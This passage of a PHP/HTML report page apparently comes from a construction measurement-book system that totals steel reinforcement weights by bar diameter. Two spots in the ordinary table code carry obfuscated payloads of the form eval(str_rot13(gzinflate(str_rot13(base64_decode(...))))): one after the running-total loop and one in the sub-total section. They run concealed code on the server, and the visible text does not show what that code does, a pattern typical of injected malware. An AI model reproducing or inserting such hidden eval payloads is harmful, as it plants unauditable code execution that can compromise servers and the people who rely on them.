                else { ?><td width='7%' class=''></td> <?php }
        if($measurementdia == 10){ ?><td width='7%' class='' style="text-align:right"><?php $dia = 10; echo number_format($totaldia,$decimal,".",","); ?></td><?php $totaldiaten+=$totaldia; }    
                else { ?><td width='7%' class=''></td> <?php }           
        if($measurementdia == 12){ ?><td width='7%' class='' style="text-align:right"><?php $dia = 12; echo number_format($totaldia,$decimal,".",","); ?></td><?php $totaldiatwelve+=$totaldia; }                
                else { ?><td width='7%' class=''></td> <?php }         
        if($measurementdia == 16){ ?><td width='7%' class='' style="text-align:right"><?php $dia = 16; echo number_format($totaldia,$decimal,".",","); ?></td><?php $totaldiasixteen+=$totaldia; }  
                else { ?><td width='7%' class=''></td> <?php }    
        if($measurementdia == 20){ ?><td width='7%' class='' style="text-align:right"><?php $dia = 20; echo number_format($totaldia,$decimal,".",","); ?></td><?php $totaldiatwenty+=$totaldia; }      
                else { ?><td width='7%' class=''></td> <?php }      
        if($measurementdia == 25){ ?><td width='7%' class='' style="text-align:right"><?php $dia = 25; echo number_format($totaldia,$decimal,".",","); ?></td><?php $totaldiatwentyfive+=$totaldia; }     
                else { ?><td width='7%' class=''></td> <?php }  
        if($measurementdia == 28){ ?><td width='7%' class='' style="text-align:right"><?php $dia = 28; echo number_format($totaldia,$decimal,".",","); ?></td><?php $totaldiatwentyeight+=$totaldia; }     
                else { ?><td width='7%' class=''></td> <?php }   
        if($measurementdia == 32){ ?><td width='7%' class='' style="text-align:right"><?php $dia = 32; echo number_format($totaldia,$decimal,".",","); ?></td><?php $totaldiathirtytwo+=$totaldia; }             
                else { ?><td width='7%' class=''></td> <?php }
		if($measurementdia == 36){ ?><td width='6%' class='' style="text-align:right"><?php $dia = 36; echo number_format($totaldia,$decimal,".",","); ?></td><?php $totaldiathirtysix+=$totaldia; }             
                else { ?><td width='6%' class=''></td> <?php }		                
                  ?> 
                     <!--<td width='2%' class='labelcenter'><?php //echo $List->remarks; ?></td>-->
                </tr>
                <?php
               
                $prevdate = $List->date;
				$page_check_last_row = $prevpage;
				$prevpage = $mpage; $prevmbookno = $mbookno;
                $sumst .= $dia."*".$totaldia."@";
                $temp = 0;
				if($currentline>31)
				{ 
					if(($prevsubdivid == $List->subdivid) && ($prevdate == $List->date))
					{
					echo display_carry($sumst,$mbookno,$mpage,$NextMBList[$NextMbIncr],$decimal,$NextMBPageList[$NextMbIncr]);
					}
					echo check_line($currentline,$tablehead,$start_line,$title,$mpage,$mbookno,$NextMBList[$NextMbIncr],$table1,$NextMBPageList[$NextMbIncr]); $currentline = 0;$currentline = $start_line + 13;$mpage++;	
					/////////// THIS IS FOR MULTIPLE MB SELECT CHANGE ON JUNE 2019 //////////
					if($mpage > 100){ if($NextMBFlag == 0){ $NextMBOption = $NextMBOption + 1; $mpage = 1; }else{ $UsedMBArr[$mbookno][1] = $mpage-1; $UsedMBArr[$mbookno][2] = 0; $mbookno = $NextMBList[$NextMbIncr]; $mpage = $NextMBPageList[$NextMbIncr]; $NextMbIncr++; } }
				}
				$prevsubdiv_name = $List->subdiv_name;
				if(($sub_type == 'c') && ($meas_no != 0) && ($meas_no != ""))
				{
                $summary1 .= $List->subdiv_name.",".$List->date.",".$mpage.",".$mbookno.","."".",".$List->subdivid.",".$List->div_id.","."".","."".","."".","."".","."".","."".","."".","."".","."".",".$txtboxid.",".$decimal.",".$meas_no.",".$sub_type."@";//echo $summary1;
				//echo $summary1."hghfgj<br/>";
				//echo $summary1."SSSS<br/>";
				}
				//echo $sub_type."<br/>";
                $prevsubdivid = $List->subdivid;
				$prev_sub_type = $sub_type;
				$prevdivid = $List->div_id; 
				$prev_decimal = $decimal;
				$tot_8 = "";$tot_10 = "";$tot_12 = "";$tot_16 = "";$tot_20 = "";$tot_25 = "";$tot_28 = "";$tot_32 = "";$tot_36 = "";
                $tot8 = "";$tot10 = "";$tot12 = ""; $tot16 = ""; $tot20 = ""; $tot25 = ""; $tot28 = ""; $tot32 = "";$tot36 = "";
				$txtboxid++;
                } //echo $currentline;
				
	if($mpage > 100)
	{
		/*$currentline = $start_line + 13;
		$prevpage = 100;
		$mpage = $newmbookpageno;
		//$prevpage = $mpage;
		$mbookno = $newmbookno;*/
	}			
				
				
				
				
				
                            $tmb2 = $sumst;
                             $explodedval2 = explode("@",$tmb2); 
                             for($i=0;$i<count($explodedval2);$i++)
                             {
                                 if($explodedval2[$i] != "")
                                 {
                                 $expval2 = explode("*",$explodedval2[$i]); 
                                 if($expval2[0] == 8){ $tot8 = $tot8 + $expval2[1]; }
                                 if($expval2[0] == 10){ $tot10 = $tot10 + $expval2[1]; }
                                 if($expval2[0] == 12){ $tot12 = $tot12 + $expval2[1]; }
                                 if($expval2[0] == 16){ $tot16 = $tot16 + $expval2[1]; }
                                 if($expval2[0] == 20){ $tot20 = $tot20 + $expval2[1]; }
                                 if($expval2[0] == 25){ $tot25 = $tot25 + $expval2[1]; }
                                 if($expval2[0] == 28){ $tot28 = $tot28 + $expval2[1]; }
                                 if($expval2[0] == 32){ $tot32 = $tot32 + $expval2[1]; }
								 if($expval2[0] == 36){ $tot36 = $tot36 + $expval2[1]; }
                                 }
                             }//echo $mpage;exit;
                ?>
                <!---   THIS IS FOR LAST ROW TOTAL IN WHILE LOOP -->
				<?php 
				eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));

				if($prev_sub_type == 'c')
				{
				//$summary2  .= $prevsubdiv_name.",".$prevdate.",".$mpage.",".$mbookno.","."".",".$prevsubdivid.",".$prevdivid.","."".","."".","."".","."".","."".","."".","."".","."".","."".",".$txtboxid.",".$prev_decimal.",".$prev_meas_no.",".$prev_sub_type."@";
				}
				else
				{
				$summary2  .= $prevsubdiv_name.",".$prevdate.",".$mpage.",".$mbookno.",".$totalweight_MT.",".$prevsubdivid.",".$prevdivid.",".$tot8.",".$tot10.",".$tot12.",".$tot16.",".$tot20.",".$tot25.",".$tot28.",".$tot32.",".$tot36.",".$txtboxid.",".$prev_decimal.","."".",".""."@";
				}
				$currentline++;
				//if($currentline>31){ echo check_line($currentline,$tablehead,$start_line,$title,$mpage,$mbookno,$newmbookno,$table1); $currentline = 0;$currentline = $start_line + 13;$mpage++;}
				//echo $_SESSION['last_row_check'];
				if($_SESSION['last_row_check'] == 1)
				{
				?>
				<tr height=''>
                    <td width='' colspan="7" class='labelbold' style='text-align:right'><?php echo "B/f from Page ".$page_check_last_row."/ Steel MB No.".$prevmbookno."";  ?></td>
                    <td width='' class='labelbold' style="text-align:right"><?php if($tot8 != "") { echo number_format($tot8,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelbold' style="text-align:right"><?php if($tot10 != "") { echo number_format($tot10,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelbold' style="text-align:right"><?php if($tot12 != "") { echo number_format($tot12,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelbold' style="text-align:right"><?php if($tot16 != "") { echo number_format($tot16,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelbold' style="text-align:right"><?php if($tot20 != "") { echo number_format($tot20,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelbold' style="text-align:right"><?php if($tot25 != "") { echo number_format($tot25,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelbold' style="text-align:right"><?php if($tot28 != "") { echo number_format($tot28,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelbold' style="text-align:right"><?php if($tot32 != "") { echo number_format($tot32,$prev_decimal,".",","); } ?></td>
					<td width='' class='labelbold' style="text-align:right"><?php if($tot36 != "") { echo number_format($tot36,$prev_decimal,".",","); } ?></td>
                    <!--<td width='' class='labelbold'><?php //echo $mpage; ?></td>-->
                </tr>	
				<?php
				}
				?>
                <tr height=''>
                    <td width='' class='labelcenter'></td>
                    <td width='' class='labelcenter' bgcolor=""></td>
                    <td width='' colspan="5" class='labelbold' style='text-align:right'>
					<input type="text" name="txt_pageid" class="labelbold" readonly="" id="txt_pageid<?php echo $txtboxid; ?>" style="width:100%; text-align:right; border:none;" />
					</td>
                    <!--<td width='' class='labelcenter'></td>-->
                    <td width='' class='labelbold' style="text-align:right"><?php if($tot8 != "") { echo number_format($tot8,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelbold' style="text-align:right"><?php if($tot10 != "") { echo number_format($tot10,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelbold' style="text-align:right"><?php if($tot12 != "") { echo number_format($tot12,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelbold' style="text-align:right"><?php if($tot16 != "") { echo number_format($tot16,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelbold' style="text-align:right"><?php if($tot20 != "") { echo number_format($tot20,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelbold' style="text-align:right"><?php if($tot25 != "") { echo number_format($tot25,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelbold' style="text-align:right"><?php if($tot28 != "") { echo number_format($tot28,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelbold' style="text-align:right"><?php if($tot32 != "") { echo number_format($tot32,$prev_decimal,".",","); } ?></td>
					<td width='' class='labelbold' style="text-align:right"><?php if($tot36 != "") { echo number_format($tot36,$prev_decimal,".",","); } ?></td>
                    <!--<td width='' class='labelbold'></td>-->
                </tr>
				<tr height='' style="border:none;" class="label" align="right"><td colspan="16" style="border:none;"><br/><?php //echo $staffname." - ".$designation; ?>&nbsp;&nbsp;</td></tr>
				<tr height='' style="border:none;" class="label" align="right">
				<td colspan="5" style="border:none;">&nbsp;&nbsp;</td>
				<td colspan="6" style="border:none;">Checked By&nbsp;&nbsp;</td>
				<td colspan="5" style="border:none;">Prepared By&nbsp;&nbsp;</td>
				</tr>
				
                </tr>
                <?php
				$currentline+=3;
				/*if($currentline>32)
				{
					//echo check_line($currentline,$tablehead);
					$currentline = 0;
					$currentline = $start_line + 10;
					$mpage++;
				}*/
                
		//if($currentline>38){ echo check_line($currentline,$tablehead,$start_line,$title,$mpage,$mbookno,$newmbookno,$table1); $currentline = 0;$currentline = $start_line + 11;$mpage++;}
		
		echo check_line($currentline,$tablehead,$start_line,$title,$mpage,$mbookno,$NextMBList[$NextMbIncr],$table1,$NextMBPageList[$NextMbIncr]); $currentline = 0;$currentline = $start_line + 13;$mpage++;
			/////////// THIS IS FOR MULTIPLE MB SELECT CHANGE ON JUNE 2019 //////////
			if($mpage > 100){ if($NextMBFlag == 0){ $NextMBOption = $NextMBOption + 1; $mpage = 1; }else{ $UsedMBArr[$mbookno][1] = $mpage-1; $UsedMBArr[$mbookno][2] = 0; $mbookno = $NextMBList[$NextMbIncr]; $mpage = $NextMBPageList[$NextMbIncr]; $NextMbIncr++; } }
?>
	<tr height='25px'><td colspan="16" align="center" class="labelbold"><?php echo "Summary"; ?></td></tr>
<?php
                $summary = $summary1.$summary2;
              // echo $summary."<br/>";
                $explodsummary = explode("@",$summary);
                natsort($explodsummary);
                foreach($explodsummary as $key => $summ)
                {
                    if($summ != "")
                    {
                        $res_summ .= $summ.",";
                    }
                }
               //echo $res_summ."<br/>";
                $result_summary = explode(",",$res_summ);
               //echo $result_summary."<br/>";
                $preVal = "";$x = 0;
               // while($x < count($result_summary))
			   $subtotal_8 = 0;$subtotal_10 = 0;$subtotal_12 = 0;$subtotal_16 = 0;$subtotal_20 = 0;$subtotal_25 = 0;$subtotal_28 = 0;$subtotal_32 = 0;$subtotal_36 = 0;$count = 0;
			   $pre_subdivname = ""; $temp_var = "";$pre_subdivid = "";$summary_total = 0; $summary_total = 0; $total_couplar_no = 0;
                for($x=0;$x < count($result_summary)-1;$x+=20)
                {
					/*if($currentline>32)
					{
						
						$currentline = 0;
						$currentline = $start_line + 10;
						$mpage++;
					}*/
	/*if($mpage > 100)
	{
		$currentline = $start_line + 13;
		$prevpage = 100;
		$mpage = 1;
		//$prevpage = $mpage;
		$mbookno = $newmbookno;
	}*/
                  	$x1=$x+1; $x2=$x+2; $x3=$x+3; $x4=$x+4; $x5=$x+5; $x6=$x+6; $x7=$x+7; $x8=$x+8; $x9=$x+9; $x10=$x+10; $x11=$x+11; $x12=$x+12; $x13=$x+13; $x14=$x+14; $x15=$x+15;$x16=$x+16;$x17=$x+17;$x18=$x+18;$x19=$x+19;
					$sum_meas_no 	= $result_summary[$x18];
					$sum_sub_type 	= $result_summary[$x19];
					
						if($result_summary[$x] != $pre_subdivname)
						{
							if($pre_subdivname != "")
							{
							$count++;
							if($prev_sum_sub_type == 'c')
								{
					?>
				<tr height='' bgcolor="">
                    <td width='' class='labelcenter'></td>
                    <td width='' class='labelcenter'></td>
                    <td width='' colspan="4" align="right" class='label labelbold'>Total</td>
                    <td width='' class='labelcenter labelheadblue'></td>
                    <td width='' class='labelcenter labelbold' style="text-align:right"><?php echo $total_couplar_no; ?></td>
                    <td width='' class='labelcenter labelbold' style="text-align:right">each</td>
                    <td width='' class='labelcenter labelbold' style="text-align:right" colspan="7"><?php echo getcompositepage($sheetid,$pre_subdivid,$rbn,$zone_id); ?></td>
                    <!--<td width='' class='labelcenter'></td>-->
                </tr>	
				<!--<tr height='' bgcolor="">
                   <td width='' class='labelcenter'></td>
                   <td width='' class='labelcenter'><?php //echo "C/o to P".$mpage." MB".$mbookno."";  ?></td>
                   <td width='' colspan="3" class='labelcenter labelheadblue'>Total</td>
                   <td width='' colspan="10" class='labelcenter labelheadblue'><?php echo $total_couplar_no." each"; ?></td>
                </tr>-->
					<?php		
								$currentline = $currentline+1;	
								$totalweight_MT = $total_couplar_no;
								$total_couplar_no = 0;	
								}
								else
								{
							?>
				<tr height=''>
                    <td width='' class='labelcenter'></td>
                    <td width='' class='labelcenter'></td>
                    <td width='' colspan="4" class='labelcenter'>Sub Total</td>
                    <td width='' class='labelcenter'></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($subtotal_8 != 0) { echo $subtotal_8; } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($subtotal_10 != 0) { echo $subtotal_10; } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($subtotal_12 != 0) { echo $subtotal_12; } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($subtotal_16 != 0) { echo $subtotal_16; } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($subtotal_20 != 0) { echo $subtotal_20; } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($subtotal_25 != 0) { echo $subtotal_25; } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($subtotal_28 != 0) { echo $subtotal_28; } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($subtotal_32 != 0) { echo $subtotal_32; } ?></td>
					<td width='' class='labelcenter' style="text-align:right"><?php if($subtotal_36 != 0) { echo $subtotal_36; } ?></td>
                    <!--<td width='' class='labelcenter'></td>-->
                </tr>
				<!--<tr>
					<td width='' class='labelcenter'></td>
                    <td width='' class='labelcenter'></td>
                    <td width='' colspan="7" align="right" class='label labelheadblue'><?php echo getcompositepage($sheetid,$pre_subdivid,$rbn,$zone_id); ?></td>
                    <td width='' class='labelcenter labelheadblue' style="text-align:right"></td>
                    <td width='' class='labelcenter labelheadblue' style="text-align:right"></td>
                    <td width='' class='labelcenter labelheadblue' style="text-align:right"></td>
                    <td width='' class='labelcenter labelheadblue' style="text-align:right"></td>
                    <td width='' class='labelcenter labelheadblue' style="text-align:right"></td>
					<td width='' class='labelcenter labelheadblue' style="text-align:right"></td>
                    <td width='' class='labelcenter'></td>
				</tr>-->
				<tr height='' bgcolor="">
                    <td width='' class='labelcenter'></td>
                    <td width='' class='labelcenter'></td>
                    <td width='' colspan="4" class='labelcenter'>Unit Weight</td>
                    <td width='' class='labelcenter'></td>
                    <td width='' class='labelcenter' style="text-align:right">0.395</td>
                    <td width='' class='labelcenter' style="text-align:right">0.617</td>
                    <td width='' class='labelcenter' style="text-align:right">0.888</td>
                    <td width='' class='labelcenter' style="text-align:right">1.578</td>
                    <td width='' class='labelcenter' style="text-align:right">2.466</td>
                    <td width='' class='labelcenter' style="text-align:right">3.853</td>
                    <td width='' class='labelcenter' style="text-align:right">4.834</td>
                    <td width='' class='labelcenter' style="text-align:right">6.313</td>
					<td width='' class='labelcenter' style="text-align:right">7.990</td>
                    <!--<td width='' class='labelcenter'></td>-->
                </tr>	
							<?php
				eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));

				
				?>
				<tr height='' bgcolor="">
                    <td width='' class='labelcenter'></td>
                    <td width='' class='labelcenter'></td>
                    <td width='' colspan="4" class='labelcenter'>Total Weight</td>
                    <td width='' class='labelcenter'></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($total_8 != 0) { echo $total_8; } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($total_10 != 0) { echo $total_10; } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($total_12 != 0) { echo $total_12; } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($total_16 != 0) { echo $total_16; } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($total_20 != 0) { echo $total_20; } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($total_25 != 0) { echo $total_25; } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($total_28 != 0) { echo $total_28; } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($total_32 != 0) { echo $total_32; } ?></td>
					<td width='' class='labelcenter' style="text-align:right"><?php if($total_36 != 0) { echo $total_36; } ?></td>
                    <!--<td width='' class='labelcenter'></td>-->
                </tr>
				<tr height='' bgcolor="">
                   <td width='' class='labelcenter'></td>
                   <td width='' class='labelcenter'></td>
                   <td width='' colspan="4" class='labelcenter'>Total in kgs</td>
                   <td width='' colspan="5" class='labelcenter'><?php echo $totalweight_KGS." kgs"; ?></td>
                   <td width='' colspan="5" class='labelcenter'></td>
				   
                </tr>
				<tr height=''>
                   <td width='' class='labelcenter'></td>
                   <td width='' class='labelcenter'><?php //echo "C/o to P".$mpage." MB".$mbookno."";  ?></td>
                   <td width='' colspan="4" align="right" class='labelbold'>Total in MT</td>
                   <td width='' colspan="5" align="center" class='labelbold'><?php echo $totalweight_MT." MT"; ?></td>
                   <td width='' colspan="5" class='labelbold' style='text-align:right'><?php echo getcompositepage($sheetid,$pre_subdivid,$rbn,$zone_id); ?></td>
				   
                </tr>
				<?php
									
				$currentline = $currentline+5;
										}
				if($currentline>30){ 
					echo check_line($currentline,$tablehead,$start_line,$title,$mpage,$mbookno,$NextMBList[$NextMbIncr],$table1,$NextMBPageList[$NextMbIncr]); $currentline = 0;$currentline = $start_line + 13;$mpage++;
					/////////// THIS IS FOR MULTIPLE MB SELECT CHANGE ON JUNE 2019 //////////
					if($mpage > 100){ if($NextMBFlag == 0){ $NextMBOption = $NextMBOption + 1; $mpage = 1; }else{ $UsedMBArr[$mbookno][1] = $mpage-1; $UsedMBArr[$mbookno][2] = 0; $mbookno = $NextMBList[$NextMbIncr]; $mpage = $NextMBPageList[$NextMbIncr]; $NextMbIncr++; } }
				}
				
				$summary_str1 .= $pre_subdivname.",".$pre_subdivid.",".$totalweight_MT.",".$pre_divid.",".$pre_mbookno.",".$mpage.",";
